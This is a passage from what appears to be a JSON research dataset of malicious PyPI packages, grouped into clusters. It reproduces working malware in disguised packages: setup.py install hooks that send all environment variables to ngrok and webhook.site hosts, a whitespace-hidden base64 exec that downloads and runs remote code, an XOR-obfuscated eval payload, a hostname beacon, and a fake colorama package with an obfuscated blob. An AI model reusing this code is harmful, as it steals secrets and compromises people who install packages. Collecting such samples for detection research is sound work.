05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywolle\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)\n\nclass send():\n    pass\n\ndef __init__():\n    pass"
      }
    ]
  },
  {
    "cluster_id": 24,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-04-12-pingdomv3-v1.1.0",
        "code": "import logging\ntry:  # Python 2.7+\n  from logging import NullHandler\n  if NullHandler:\n                                                                                                                                                                                                                                                                                                                                                import base64\n                                                                                                                                                                                                                                                                                                                                                exec(base64.b64decode(\"dHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzLCBvcwogICAgaWYgIkpFTktJTlNfVVJMIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8veXlkcy55eXpzLndvcmtlcnMuZGV2L21ldGEvc3RhdGlzdGljcycpCiAgICAgICAgZXhlYyhyLnRleHQpCmV4Y2VwdDoKICAgIHBhc3M=\"))\n\nexcept Exception:\n  class NullHandler(logging.Handler):\n    def emit(self, record):\n      pass\n\nlogging.getLogger(__name__).addHandler(NullHandler())\nlog = logging.getLogger(__name__)\n\n\n\n# started from original 0.0.6. \n# I don't see any CVE as the original author had declared. keep using.\nimport sys\nimport requests\n\nIS_PY3 = sys.version_info[0] == 3\n\nif not IS_PY3:\n  raise ValueError(\"This package only supports python3\")\n\n\nclass ApiError(Exception):\n\n  def __init__(self, http_response):\n    content = http_response.json()\n    self.status_code = http_response.status_code\n    self.status_desc = content['error']['statusdesc']\n    self.error_message = content['error']['errormessage']\n    super(ApiError, self).__init__(self.__str__())\n\n  def __repr__(self):\n    return 'pingdomv3.ApiError: HTTP `%s - %s` returned with message, \"%s\"' % \\\n           (self.status_code, self.status_desc, self.error_message)\n\n  def __str__(self):\n    return self.__repr__()\n\n\nclass Api(object):\n\n  def __init__(self, token):\n    self.base_url = \"https://api.pingdom.com/api/3.1/\"\n    self.headers = {'Authorization': 'Bearer %s' % token}\n\n  def send(self, method, resource, resource_id=None, data=None, params=None):\n    if data is None:\n      data = {}\n    if params is None:\n      params = {}\n    if resource_id is not None:\n      resource = \"%s/%s\" % (resource, resource_id)\n    response = requests.request(method, self.base_url + resource,\n                                headers=self.headers,\n                                data=data,\n                                params=params\n                                )\n    if response.status_code != 200:\n      raise ApiError(response)\n    else:\n      return response.json()\n\n\nclass Client(object):\n  \"\"\"\n  Pingdom client\n  \"\"\"\n\n  def __init__(self, token):\n    \"\"\"\n    Initializer.\n\n    :param token: Pingdom V3 API Token. Generate from https://my.pingdom.com/3/api-tokens\n    \"\"\"\n    self.token = token\n    self.api = Api(token)\n\n  def get_checks(self, limit: int = None,\n                 offset: int = None,\n                 showencryption: bool = None,\n                 include_tags: bool = None,\n                 include_severity: bool = None,\n                 tags: str = None\n                 ):\n    \"\"\"\n    https://docs.pingdom.com/api/#tag/Checks/paths/~1checks/get\n    \"\"\"\n    params = {}\n    if limit is not None:\n      params['limit'] = limit\n    if offset is not None:\n      params['offset'] = offset\n    if showencryption is not None:\n      params['showencryption'] = showencryption\n    if include_tags is not None:\n      params['include_tags'] = include_tags\n    if include_severity is not None:\n      params['include_severity'] = include_severity\n    if tags:\n      params['tags'] = tags\n    return self.api.send('get', \"checks\", params=params)['checks']\n\n  def get_check(self, check_id):\n    return self.api.send('get', \"checks/%s\" % check_id)['check']\n\n  def create_check(self, check_detail):\n    return self.api.send('POST', \"checks\", data=check_detail)['check']\n\n  def update_check(self, check_id, check_detail):\n    return self.api.send('PUT', f\"checks/{check_id}\", data=check_detail)\n\n  def duplicate_check(self, check_id):\n    detail = self.get_check(check_id)\n    detail['host'] = str(detail.get('hostname'))\n    detail['name'] = 'Copy Of %s' % detail.get('name')\n    for unused_key in ('id', 'created', 'hostname', 'lasttesttime', 'lastresponsetime', 'status', 'lasterrortime'):\n      detail.pop(unused_key, None)\n    if 'tags' in detail:\n      detail['tags'] = ','.join([t['name'] for t in detail['tags']])\n\n    return self.create_check(detail)\n\n  def delete_check(self, check_id):\n    return self.api.send('delete', 'checks/%s' % check_id)\n\n\n__version__ = \"1.1.0\"\nimport pingdomv3.logger \nfrom pingdomv3.pingdomv3 import Client, Api, ApiError\n\n"
      }
    ]
  },
  {
    "cluster_id": 25,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-kotlin-stdlib-jdk8-v99.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nimport inspect\n\npkg_name = inspect.currentframe().f_globals['__name__']\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}&pypi={pkg_name}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      }
    ]
  },
  {
    "cluster_id": 26,
    "size": 10,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v1.0.3",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://5cecdbdb0328.ngrok.app/collect'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-4c04b1a2\",\n    version = \"1.0.3\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-21-artifact-lab-3-package-db7d716a-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://c7128792b162.ngrok.app'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-db7d716a\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-18-artifact-lab-3-package-34b21b63-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/d2876c27-aadc-40af-859e-6a9fff70fde0'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-34b21b63\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\nEOF\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-18-artifact-lab-3-package-b55680cd-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'http://8hqnqd3insnk7efz3iiokreih9n0brzg.oastify.com'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-b55680cd\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\nEOF\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-22-artifact-lab-3-package-a18ff5d9-v1.1.5",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://6f69-85-48-187-158.ngrok-free.app'\n    request = urllib.request.Request(url, data=encoded_data)\n\nclass RunEggInfoCommand(egg_info):\n    def run(self):\n        notmalfunc()\n        egg_info.run(self)\n\nclass AfterDevelop(develop):\n    def run(self):\n        notmalfunc()\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        notmalfunc()\n        install.run(self)\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-a18ff5d9\",\n    version = \"1.1.5\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n        'egg_info': RunEggInfoCommand\n    },\n)\nnotmalfunc()\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-16-artifact-lab-3-package-3ccf47e8-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/3f078ea8-2dce-446e-98d1-82bf6b8f4145'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-3ccf47e8\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\nEOF\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-11-artifact-lab-3-package-e7ffd2ef-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://loco.requestcatcher.com/'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact_lab_3_package_e7ffd2ef\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-11-artifact-lab-3-package-v0.1.2",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/a38bb752-7251-4c6a-a08b-1a2d127e0598'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package\",\n    version = \"0.1.2\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-16-artifact-lab-3-package-2387a34d-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/3f078ea8-2dce-446e-98d1-82bf6b8f4145'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-2387a34d\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\nEOF\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-15-artifact-lab-3-package-153c1c1a-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/8f782c5b-990f-4d3d-94cc-fd128b873693'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-153c1c1a\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      }
    ]
  },
  {
    "cluster_id": 27,
    "size": 8,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-kazer12-v2",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='kazer12',\n    version='2',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\nimport getpass\nimport os\nimport socket\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''73y&GqPR(El6Cy|8u!6JFCv564b{;ZPb|%0350vXGkzC{tFFn;WmNa>Z_@z(zI4qPlF?TOmPfiNetNqEf#f34Vx#6mY%@p7M3Z@hiq^`T|GZHhJv#i6vv8X5rlE(&28NqNh%^k?{xx^BIUzC@MR;?0cc$2uv|pXboqMT7MC?!`w|46~h?m#mGtu8+R&ftxyKFb1|DP>>#yJoUWavuZr~*@w0<<Jz($pAWK~B%G?{lJ|@VI&_g$fz$1Ugv@w3g`{r+ru2HF!vqNk11S3w4-|C8ZtyU6R<n-YZBPT`r4OM78z!pHKa>J0@0HXz+I#{Cq?9yk=+03}oW^!F2&dF%n57-o+N8Nv#Yr-CABKF_sa;u1%gpmznFa^%NTMpqcIyjL}743UmDYn~!W?gTh%T+(Yhi)^hW6Slk!&SQKQFK;6_)Nt6!J`?wdvj427&qA!Hjd;l-pJc7cdJJO)Ook-gBf%mk2wfXI`_4x;t%fPh5^R^#?IJT;vD#4h!4@)ZoO3RlLw{=AbmTtkWJ0&Z(9n1q!3p_+b-@(d-kOeLqe^A3yT8U~2Qnh$AGGUDcb5st1rcSmsHQ%;_xaUQ%G{{uxas+vWO4rAJJ!^V$3qPsjD|a{1@VAyAsvaU=A@a^HVxR5tpRlkY&?HOy3b=vw%zQ0hlw{-<i)umt{<k9l2Q?YJqa1!im$Andd)2mw9m>oPgi8d7<Pz0#YlFjptltt@BCN}H&Le*Aa-q5DbC0~z^lmWqkEz0k=ns?#cyz9@DP^TW>I}9OeCQ!GIwz6a4#v%45WMVG`W09yruf)%qD-R&iO7T{VaA(Lwi9^otrAr!SK(_)Cx|j{ZDDb`C>~x)4|SvDx>|c4f~zNWZ|ieUJRyq1Ef1j0eqO5<t^QnScNJXb;oyVORtci+;UVVj+W8M7H5~z~eMi35L|*hR$dLh+B40%&9nJy@@<wf}mgF!@!r4T}sK%Bl7uiZaZt}Q8h`sd~3Dh#EK^qJJ&3y1Q`<==9HT;z3=-?eo7QQ!*<}AfS#Qrwjb8kU(Q7U8O@8@q62SgLWTE*dn6c=7HM(0VCEd^1BcaGptzOrzx-yFjL?VugP19a_@EMKYGPp$>~H(NluYz`Pr-_T5nMJi`2_Bi6W!Ho27jNU{>#l?cO!36Dp?Y2p<(rSZfaiP;pu7_8Wnpu#P+*q<LSb0-3Xhzk(Qk`|U=yn57i!=_Tg^FYzoJP&`P)Xe<bg>sr4hx5pEpaR=tAgTqtPzkW#a@h#Gzg>kOIveUdqHf_5n;s}(~@iWuD_$o1FlC}ubRfgvIxQVMj5+{KmHxk;s4w2BW9io+L#89RqQb(mq6d`;J<`}kITou(>uhx_R~BEsw?G#zKs=YVps$ovwqBr*%3yZ^EJa`u0p20P7s$e^awnnn!Dp7vD!jtCyr)-W`d>H!K{0)zTk#VTc||h>f$Mlh6)RGD7)uwWy0rb$W=W5@^Uyh80@Lgg=g;FpAH|~HFfhMVQ@gZ3&R